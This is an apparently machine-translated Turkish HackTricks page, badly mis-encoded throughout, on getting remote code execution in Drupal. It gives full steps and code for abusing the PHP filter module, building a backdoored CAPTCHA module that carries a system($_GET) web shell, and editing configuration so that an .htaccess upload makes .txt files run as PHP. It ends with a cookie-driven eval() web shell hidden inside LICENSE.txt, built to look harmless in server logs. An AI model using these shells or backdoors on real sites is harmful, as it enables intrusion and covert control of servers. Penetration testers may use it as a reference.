# Drupal RCE

<details>

<summary><strong>AWS hacklemeyi sÄ±fÄ±rdan kahramana Ã¶ÄŸrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

HackTricks'Ä± desteklemenin diÄŸer yollarÄ±:

* **Åirketinizi HackTricks'te reklamÄ±nÄ± gÃ¶rmek istiyorsanÄ±z** veya **HackTricks'i PDF olarak indirmek istiyorsanÄ±z** [**ABONELÄ°K PLANLARI**]'na(https://github.com/sponsors/carlospolop) gÃ¶z atÄ±n!
* [**Resmi PEASS & HackTricks Ã¼rÃ¼nlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)'yi keÅŸfedin, Ã¶zel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuzu
* **KatÄ±lÄ±n** ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) veya bizi **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks\_live)'da **takip edin**.
* **Hacking pÃ¼f noktalarÄ±nÄ±zÄ± paylaÅŸarak PR'lar gÃ¶ndererek** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarÄ±na.

</details>

## PHP Filtre ModÃ¼lÃ¼ ile

{% hint style="warning" %}
Drupal'Ä±n **(8. sÃ¼rÃ¼mden Ã¶nceki sÃ¼rÃ¼mlerinde)** eski sÃ¼rÃ¼mlerinde, bir yÃ¶netici olarak giriÅŸ yaparak **`PHP filtresi` modÃ¼lÃ¼nÃ¼ etkinleÅŸtirmek** mÃ¼mkÃ¼ndÃ¼, bu da "GÃ¶mÃ¼lÃ¼ PHP kodlarÄ±nÄ±n deÄŸerlendirilmesine izin verir." Ancak 8. sÃ¼rÃ¼mden itibaren bu modÃ¼l varsayÄ±lan olarak yÃ¼klenmez.
{% endhint %}

**Eklenti php'nin yÃ¼klÃ¼ olmasÄ± gerekiyor** (bunu kontrol etmek iÃ§in _/modules/php_ adresine eriÅŸerek kontrol edin ve eÄŸer **403** dÃ¶nÃ¼yorsa, **mevcut**, eÄŸer **bulunamadÄ±ysa**, o zaman **php eklentisi yÃ¼klÃ¼ deÄŸil** demektir)

_ModÃ¼ller_ -> (**Kontrol Et**) _PHP Filtresi_ -> _YapÄ±landÄ±rmayÄ± Kaydet_

![](<../../../.gitbook/assets/image (247) (1).png>)

ArdÄ±ndan _Ä°Ã§erik Ekle_'ye tÄ±klayÄ±n -> _Temel Sayfa_ veya _Makale_ seÃ§in -> _GÃ¶vdede php kabuk kodunu yazÄ±n_ -> _Metin formatÄ±nda_ _PHP kodu_ seÃ§in -> _Ã–nizleme_ seÃ§in

![](<../../../.gitbook/assets/image (338).png>)

Son olarak, sadece yeni oluÅŸturulan dÃ¼ÄŸÃ¼me eriÅŸin:
```bash
curl http://drupal-site.local/node/3
```
## PHP Filtre ModÃ¼lÃ¼nÃ¼ YÃ¼kle

{% hint style="warning" %}
Mevcut sÃ¼rÃ¼mlerde, varsayÄ±lan kurulumdan sonra yalnÄ±zca web'e eriÅŸim saÄŸlayarak eklentileri yÃ¼klemek artÄ±k mÃ¼mkÃ¼n deÄŸil.
{% endhint %}

**8 ve sonraki sÃ¼rÃ¼mlerde**, [**PHP Filtre**](https://www.drupal.org/project/php/releases/8.x-1.1) **modÃ¼lÃ¼ artÄ±k varsayÄ±lan olarak yÃ¼klenmiyor**. Bu iÅŸlevselliÄŸi kullanabilmek iÃ§in **modÃ¼lÃ¼ kendimiz yÃ¼klememiz gerekecek**.

1. ModÃ¼lÃ¼n en gÃ¼ncel sÃ¼rÃ¼mÃ¼nÃ¼ Drupal web sitesinden indirin.
2. wget https://ftp.drupal.org/files/projects/php-8.x-1.1.tar.gz
3. Ä°ndirildikten sonra **`YÃ¶netim`** > **`Raporlar`** > **`KullanÄ±labilir gÃ¼ncellemeler`** bÃ¶lÃ¼mÃ¼ne gidin.
4. **`GÃ¶z at`**'e tÄ±klayÄ±n, dosyayÄ± indirdiÄŸimiz dizinden seÃ§in ve ardÄ±ndan **`YÃ¼kle`**'ye tÄ±klayÄ±n.
5. ModÃ¼l yÃ¼klendikten sonra **`Ä°Ã§erik`**'e tÄ±klayarak **yeni bir temel sayfa oluÅŸturun**, Drupal 7 Ã¶rneÄŸinde yaptÄ±ÄŸÄ±mÄ±z gibi. Yine, **`Metin biÃ§imi` aÃ§Ä±lÄ±r menÃ¼sÃ¼nden `PHP kodu`'nu seÃ§tiÄŸinizden emin olun**.

## Arka KapÄ±lÄ± ModÃ¼l

{% hint style="warning" %}
Mevcut sÃ¼rÃ¼mlerde, varsayÄ±lan kurulumdan sonra yalnÄ±zca web'e eriÅŸim saÄŸlayarak eklentileri yÃ¼klemek artÄ±k mÃ¼mkÃ¼n deÄŸil.
{% endhint %}

Bir arka kapÄ±lÄ± modÃ¼l, **mevcut bir modÃ¼le bir kabuk ekleyerek oluÅŸturulabilir**. ModÃ¼ller drupal.org web sitesinde bulunabilir. [CAPTCHA](https://www.drupal.org/project/captcha) gibi bir modÃ¼l seÃ§elim. AÅŸaÄŸÄ± kaydÄ±rÄ±n ve tar.gz [arÅŸivi](https://ftp.drupal.org/files/projects/captcha-8.x-1.2.tar.gz) iÃ§in baÄŸlantÄ±yÄ± kopyalayÄ±n.

* ArÅŸivi indirin ve iÃ§eriÄŸini Ã§Ä±karÄ±n.
```
wget --no-check-certificate  https://ftp.drupal.org/files/projects/captcha-8.x-1.2.tar.gz
tar xvf captcha-8.x-1.2.tar.gz
```
* Ä°Ã§eriÄŸi olan bir **PHP web kabuÄŸu** oluÅŸturun:
```php
<?php
system($_GET["cmd"]);
?>
```
* ArdÄ±ndan, kendimize klasÃ¶re eriÅŸim saÄŸlamak iÃ§in bir **`.htaccess`** dosyasÄ± oluÅŸturmamÄ±z gerekmektedir. Bu, Drupal'Ä±n **`/modules`** klasÃ¶rÃ¼ne doÄŸrudan eriÅŸimi reddettiÄŸi iÃ§in gereklidir.
```html
<IfModule mod_rewrite.c>
RewriteEngine On
RewriteBase /
</IfModule>
```
* YukarÄ±daki yapÄ±landÄ±rma, /modules iÃ§inde bir dosya istediÄŸimizde / klasÃ¶rÃ¼ iÃ§in kurallar uygulayacaktÄ±r. Bu dosyalarÄ±n her ikisini de captcha klasÃ¶rÃ¼ne kopyalayÄ±n ve bir arÅŸiv oluÅŸturun.
```bash
mv shell.php .htaccess captcha
tar cvf captcha.tar.gz captcha/
```
* Website'ye **yÃ¶netici eriÅŸimi** olduÄŸunu varsayarak, **`YÃ¶net`** Ã¼zerine tÄ±klayÄ±n ve ardÄ±ndan kenar Ã§ubuÄŸunda **`GeniÅŸlet`** seÃ§eneÄŸine tÄ±klayÄ±n. Daha sonra **`+ Yeni modÃ¼l yÃ¼kle`** dÃ¼ÄŸmesine tÄ±klayarak yÃ¼kleme sayfasÄ±na yÃ¶nlendirileceksiniz, Ã¶rneÄŸin `http://drupal-site.local/admin/modules/install` BaÄŸlantÄ±sÄ±na giderek backdoorlu Captcha arÅŸivine gÃ¶z atÄ±n ve **`YÃ¼kle`**'ye tÄ±klayÄ±n.
* Kurulum baÅŸarÄ±lÄ± olduÄŸunda, komutlarÄ± yÃ¼rÃ¼tmek iÃ§in **`/modules/captcha/shell.php`** sayfasÄ±na gidin.

## Drupal'Ä± YapÄ±landÄ±rma Senkronizasyonu ile Backdoor Ekleme <a href="#backdooring-drupal" id="backdooring-drupal"></a>

**TarafÄ±ndan paylaÅŸÄ±lan yazÄ±** [**Coiffeur0x90**](https://twitter.com/Coiffeur0x90)

### BÃ¶lÃ¼m 1 (_Media_ ve _Media KÃ¼tÃ¼phanesi_ etkinleÅŸtirme)

_Etend_ menÃ¼sÃ¼nde (/admin/modules), zaten yÃ¼klÃ¼ gibi gÃ¶rÃ¼nen eklentileri etkinleÅŸtirebilirsiniz. VarsayÄ±lan olarak, _Media_ ve _Media KÃ¼tÃ¼phanesi_ eklentilerinin etkin olmadÄ±ÄŸÄ± gÃ¶rÃ¼nÃ¼yor, bu yÃ¼zden onlarÄ± etkinleÅŸtirelim.

EtkinleÅŸtirmeden Ã¶nce:

<figure><img src="../../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>

EtkinleÅŸtirdikten sonra:

<figure><img src="../../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>

### BÃ¶lÃ¼m 2 (_YapÄ±landÄ±rma senkronizasyonu_ Ã¶zelliÄŸinden faydalanma) <a href="#part-2-leveraging-feature-configuration-synchronization" id="part-2-leveraging-feature-configuration-synchronization"></a>

Drupal yapÄ±landÄ±rma giriÅŸlerini dÃ¶kÃ¼mlemek (dÄ±ÅŸa aktarmak) ve yÃ¼klemek (iÃ§e aktarmak) iÃ§in _YapÄ±landÄ±rma senkronizasyonu_ Ã¶zelliÄŸinden faydalanacaÄŸÄ±z:

* /admin/config/development/configuration/single/export
* /admin/config/development/configuration/single/import

**Sistem dosyasÄ±nÄ± yama system.file.yml**

Ä°lk giriÅŸi yamalamaya baÅŸlayalÄ±m `allow_insecure_uploads`'den:

Dosya: system.file.yml
```

...

allow_insecure_uploads: false

...

```
<figure><img src="../../../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>

Dosya: system.file.yml
```

...

allow_insecure_uploads: true

...

```
<figure><img src="../../../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>

**field.field.media.document.field\_media\_document.yml** dosyasÄ±nÄ± yamultayÄ±n

Daha sonra, ikinci giriÅŸi ÅŸu ÅŸekilde yamultayÄ±n: 

Dosya: field.field.media.document.field\_media\_document.yml
```

...

file_directory: '[date:custom:Y]-[date:custom:m]'
file_extensions: 'txt rtf doc docx ppt pptx xls xlsx pdf odf odg odp ods odt fodt fods fodp fodg key numbers pages'

...
```
<figure><img src="../../../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>

Dosya: field.field.media.document.field\_media\_document.yml
```
...

file_directory: '[date:custom:Y]-[date:custom:m]'
file_extensions: 'htaccess txt rtf doc docx ppt pptx xls xlsx pdf odf odg odp ods odt fodt fods fodp fodg key numbers pages'

...

```
> Bu blog yazÄ±sÄ±nda kullanmasam da, giriÅŸ `file_directory`'nin keyfi bir ÅŸekilde tanÄ±mlanabileceÄŸi ve yol travmasÄ± saldÄ±rÄ±sÄ±na aÃ§Ä±k olduÄŸu belirtilmiÅŸtir (bu sayede Drupal dosya sistemi aÄŸacÄ± iÃ§inde yukarÄ± Ã§Ä±kabiliriz).

<figure><img src="../../../.gitbook/assets/image (6).png" alt=""><figcaption></figcaption></figure>

### BÃ¶lÃ¼m 3 (Ã¶zellik _Belge Ekleme_ kullanÄ±mÄ±) <a href="#part-3-leveraging-feature-add-document" id="part-3-leveraging-feature-add-document"></a>

Son adÄ±m en basittir ve iki alt adÄ±ma ayrÄ±lÄ±r. Ä°lk adÄ±m, .htaccess formatÄ±nda bir dosya yÃ¼klemek ve Apache direktiflerini kullanarak .txt dosyalarÄ±nÄ±n PHP motoru tarafÄ±ndan yorumlanmasÄ±na izin vermek iÃ§in. Ä°kinci adÄ±m ise payload iÃ§eren bir .txt dosyasÄ±nÄ± yÃ¼klemektir.

Dosya: .htaccess
```
<Files *>
SetHandler application/x-httpd-php
</Files>

# Vroum! Vroum!
# We reactivate PHP engines for all versions in order to be targetless.
<IfModule mod_php.c>
php_flag engine on
</IfModule>
<IfModule mod_php7.c>
php_flag engine on
</IfModule>
<IfModule mod_php5.c>
php_flag engine on
</IfModule>
```
Neden bu hile harika?

Ã‡Ã¼nkÃ¼ Webshell (ki ona LICENSE.txt diyeceÄŸiz) Web sunucusuna bÄ±rakÄ±ldÄ±ÄŸÄ±nda, komutlarÄ±mÄ±zÄ± `$_COOKIE` Ã¼zerinden iletebiliriz ve Web sunucusu gÃ¼nlÃ¼klerinde bu, metin dosyasÄ±na yapÄ±lmÄ±ÅŸ meÅŸru bir GET isteÄŸi olarak gÃ¶rÃ¼necektir.

Neden Webshell'imize LICENSE.txt adÄ±nÄ± verdik?

BasitÃ§e Ã§Ã¼nkÃ¼ Ã¶rneÄŸin ÅŸu dosyayÄ± alÄ±rsak [core/LICENSE.txt](https://github.com/drupal/drupal/blob/11.x/core/LICENSE.txt) (ki zaten Drupal Ã§ekirdeÄŸinde bulunmaktadÄ±r), 339 satÄ±r ve 17.6 KB boyutunda bir dosyaya sahibiz, ki bu dosyaya PHP kodunun kÃ¼Ã§Ã¼k bir parÃ§asÄ±nÄ± eklemek iÃ§in mÃ¼kemmeldir (Ã§Ã¼nkÃ¼ dosya yeterince bÃ¼yÃ¼ktÃ¼r).

<figure><img src="../../../.gitbook/assets/image (7).png" alt=""><figcaption></figcaption></figure>

Dosya: YamasÄ±z LICENSE.txt
```txt

...

this License, you may choose any version ever published by the Free Software
Foundation.

<?php

# We inject our payload into the cookies so that in the logs of the compromised
# server it shows up as having been requested via the GET method, in order to
# avoid raising suspicions.
if (isset($_COOKIE["89e127753a890d9c4099c872704a0711bbafbce9"])) {
if (!empty($_COOKIE["89e127753a890d9c4099c872704a0711bbafbce9"])) {
eval($_COOKIE["89e127753a890d9c4099c872704a0711bbafbce9"]);
} else {
phpinfo();
}
}

?>

10. If you wish to incorporate parts of the Program into other free
programs whose distribution conditions are different, write to the author

...

```
#### **BÃ¶lÃ¼m 3.1 (dosya yÃ¼kleme .htaccess)**

Ä°lk olarak, Apache direktiflerini iÃ§eren dosyamÄ±zÄ± yÃ¼klemek iÃ§in _Add Document_ (/media/add/document) Ã¶zelliÄŸini kullanÄ±yoruz.

<figure><img src="../../../.gitbook/assets/image (8).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (9).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (10).png" alt=""><figcaption></figcaption></figure>

**BÃ¶lÃ¼m 3.2 (dosya yÃ¼kleme LICENSE.txt)**

ArdÄ±ndan, lisans dosyasÄ± iÃ§inde gizlenmiÅŸ bir Webshell yÃ¼klemek iÃ§in _Add Document_ (/media/add/document) Ã¶zelliÄŸini tekrar kullanÄ±yoruz.

<figure><img src="../../../.gitbook/assets/image (11).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (12).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (13).png" alt=""><figcaption></figcaption></figure>

### BÃ¶lÃ¼m 4 (Webshell ile etkileÅŸim) <a href="#part-4-interaction-with-the-webshell" id="part-4-interaction-with-the-webshell"></a>

Son bÃ¶lÃ¼m, Webshell ile etkileÅŸimde bulunmayÄ± iÃ§erir.

AÅŸaÄŸÄ±daki ekran gÃ¶rÃ¼ntÃ¼sÃ¼nde gÃ¶sterildiÄŸi gibi, Webshell tarafÄ±ndan beklenen Ã§erez tanÄ±mlanmamÄ±ÅŸsa, dosyayÄ± bir Web tarayÄ±cÄ±sÄ± aracÄ±lÄ±ÄŸÄ±yla danÄ±ÅŸtÄ±ÄŸÄ±mÄ±zda sonuÃ§ aÅŸaÄŸÄ±daki gibi olur.

<figure><img src="../../../.gitbook/assets/image (14).png" alt=""><figcaption></figcaption></figure>

SaldÄ±rgan Ã§erezi ayarladÄ±ÄŸÄ±nda, Webshell ile etkileÅŸimde bulunabilir ve istediÄŸi herhangi bir komutu Ã§alÄ±ÅŸtÄ±rabilir.

<figure><img src="../../../.gitbook/assets/image (15).png" alt=""><figcaption></figcaption></figure>

Ve loglarda gÃ¶rdÃ¼ÄŸÃ¼nÃ¼z gibi, yalnÄ±zca bir txt dosyasÄ±nÄ±n istendiÄŸi gÃ¶rÃ¼nÃ¼yor.

<figure><img src="../../../.gitbook/assets/image (16).png" alt=""><figcaption></figcaption></figure>

Bu makaleyi okuduÄŸunuz iÃ§in teÅŸekkÃ¼r ederim, umarÄ±m size bazÄ± kabuklar elde etmenize yardÄ±mcÄ± olur.

<details>

<summary><strong>SÄ±fÄ±rdan kahraman olmak iÃ§in AWS hackleme Ã¶ÄŸrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

HackTricks'Ä± desteklemenin diÄŸer yollarÄ±:

* **Åirketinizi HackTricks'te reklamÄ±nÄ±zÄ± gÃ¶rmek istiyorsanÄ±z** veya **HackTricks'i PDF olarak indirmek istiyorsanÄ±z** [**ABONELÄ°K PLANLARI**](https://github.com/sponsors/carlospolop)'na gÃ¶z atÄ±n!
* [**Resmi PEASS & HackTricks Ã¼rÃ¼nlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)'yi keÅŸfedin, Ã¶zel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* ğŸ’¬ **Discord grubuna** [**katÄ±lÄ±n**](https://discord.gg/hRep4RUj7f) veya **telegram grubuna** [**katÄ±lÄ±n**](https://t.me/peass) veya bizi **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks\_live)** takip edin.**
* **Hacking pÃ¼f noktalarÄ±nÄ±zÄ± gÃ¶ndererek HackTricks ve HackTricks Cloud** github depolarÄ±na PR'lar gÃ¶ndererek paylaÅŸÄ±n.

</details>
